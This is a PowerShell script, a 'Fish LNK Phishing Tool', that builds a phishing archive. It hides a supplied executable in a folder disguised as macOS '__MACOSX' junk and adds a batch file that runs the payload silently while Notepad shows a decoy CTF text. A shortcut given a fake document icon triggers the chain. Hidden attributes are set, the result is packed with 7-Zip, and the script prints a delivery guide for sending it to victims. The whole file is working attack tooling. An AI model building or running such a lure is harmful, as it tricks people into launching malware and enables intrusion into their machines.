# Fish LNK Phishing Script v3
# Based on APT tactics: LNK -> hidden folder -> run.bat (start payload + open decoy)
# Hidden folder mimics macOS __MACOSX junk, users won't notice it
# Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "CTF_challenge.txt" -IconType "txt"

param(
    [Parameter(Mandatory=$true)]
    [string]$ExePath,
    [string]$DecoyName = "CTF_challenge.txt",
    [string]$DecoyContent = "",
    [string]$IconType = "txt",
    [string]$OutputName = "challenge",
    [switch]$KeepWorking = $false
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path $ExePath)) {
    Write-Host "[!] Payload not found: $ExePath" -ForegroundColor Red
    exit 1
}

$exeName = Split-Path $ExePath -Leaf
$workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"
$hiddenDir = "__MACOSX"
$subDir = ".note"

Write-Host "[+] Fish LNK Phishing Tool v3" -ForegroundColor Cyan
Write-Host "[+] Work dir: $workDir"

# Step 1: Create hidden directory structure
Write-Host "[+] Creating directory structure..."

$hiddenPath = Join-Path $workDir $hiddenDir
$subPath = Join-Path $hiddenPath $subDir
New-Item -ItemType Directory -Path $subPath -Force | Out-Null

# Copy payload
Copy-Item $ExePath (Join-Path $subPath $exeName)

# Create decoy file
$decoyPath = Join-Path $subPath $DecoyName
if ($DecoyContent -ne "") {
    Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
} else {
    $defaultDecoy = @"
谜题：请解密以下内容获得flag
ZmxhZ3t0aGlzX2lzX2FfZmFrZV9mbGFnfQ==
提示：Base64编码
"@
    Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
}

# Step 2: Generate run.bat
Write-Host "[+] Generating run.bat..."

$batContent = @"
@echo off
start /b "" "$hiddenDir\$subDir\$exeName"
start notepad "$hiddenDir\$subDir\$DecoyName"
"@

$batPath = Join-Path $subPath "run.bat"
Set-Content -Path $batPath -Value $batContent -Encoding ASCII

# Step 3: Generate LNK
Write-Host "[+] Generating LNK shortcut..."

$lnkPath = Join-Path $workDir "$OutputName.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# LNK -> cmd.exe -> run.bat (bat handles both payload + decoy)
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c start /b """" ""$hiddenDir\$subDir\run.bat"""
$shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE

# Set icon
$iconMap = @{
    "txt"    = "$env:SystemRoot\System32\shell32.dll,70"
    "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
    "doc"    = "$env:SystemRoot\System32\shell32.dll,42"
    "xls"    = "$env:SystemRoot\System32\shell32.dll,120"
    "folder" = "$env:SystemRoot\System32\shell32.dll,3"
}

if ($iconMap.ContainsKey($IconType)) {
    $shortcut.IconLocation = $iconMap[$IconType]
} else {
    $shortcut.IconLocation = $iconMap["txt"]
}

$shortcut.Description = $DecoyName
$shortcut.Save()

Write-Host "[+] LNK generated: $lnkPath" -ForegroundColor Green
Write-Host "    Target: cmd.exe /c start /b $hiddenDir\$subDir\run.bat"
Write-Host "    Icon: $IconType"

# Step 4: Set hidden attributes on __MACOSX
Write-Host "[+] Setting hidden attributes..."

$hiddenItem = Get-Item $hiddenPath -Force
$hiddenItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory

Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
}

Write-Host "[+] Hidden attributes set on $hiddenDir" -ForegroundColor Green

# Step 5: Package with 7-Zip (required to preserve hidden attrs)
Write-Host "[+] Packaging..."

$output7z = Join-Path (Get-Location) "$OutputName.7z"
$outputZip = Join-Path (Get-Location) "$OutputName.zip"

$sevenZip = $null
$sevenZipPaths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe",
    (Get-Command 7z -ErrorAction SilentlyContinue).Source
)

foreach ($p in $sevenZipPaths) {
    if ($p -and (Test-Path $p)) { $sevenZip = $p; break }
}

if ($sevenZip) {
    Push-Location $workDir
    & $sevenZip a -r $output7z "." | Out-Null
    Pop-Location
    Write-Host "[+] 7z archive: $output7z" -ForegroundColor Green
    Write-Host "    (Uses 7z to preserve hidden folder attrs)" -ForegroundColor Yellow
} else {
    Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
    Write-Host "[+] ZIP archive: $outputZip" -ForegroundColor Yellow
    Write-Host "[!] WARNING: ZIP may lose hidden attrs. Install 7-Zip!" -ForegroundColor Red
}

# Step 6: Cleanup
if (-not $KeepWorking) {
    # Remove hidden attrs first so we can delete
    Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
        $_.Attributes = [System.IO.FileAttributes]::Normal
    }
    $hiddenItem.Attributes = [System.IO.FileAttributes]::Normal
    Remove-Item $workDir -Recurse -Force
    Write-Host "[+] Work dir cleaned" -ForegroundColor Green
} else {
    Write-Host "[*] Work dir kept: $workDir" -ForegroundColor Yellow
}

# Guide
Write-Host ""
Write-Host "========== Delivery Guide ==========" -ForegroundColor Cyan
Write-Host ""
Write-Host "Chain: LNK -> cmd.exe -> run.bat -> payload.exe + notepad decoy"
Write-Host ""
$deliverFile = if ($sevenZip) { $output7z } else { $outputZip }
Write-Host "File to send: $deliverFile"
Write-Host ""
Write-Host "User sees after extract:"
Write-Host "  $OutputName.lnk  (icon: $IconType)"
Write-Host ""
Write-Host "Hidden (user cannot see):"
Write-Host "  $hiddenDir\$subDir\run.bat"
Write-Host "  $hiddenDir\$subDir\$exeName"
Write-Host "  $hiddenDir\$subDir\$DecoyName"
Write-Host ""
Write-Host "User clicks LNK -> decoy opens in notepad -> payload runs silently"
Write-Host ""
Write-Host "IMPORTANT: Package with 7-Zip to preserve hidden attrs!"
Write-Host "======================================" -ForegroundColor Cyan
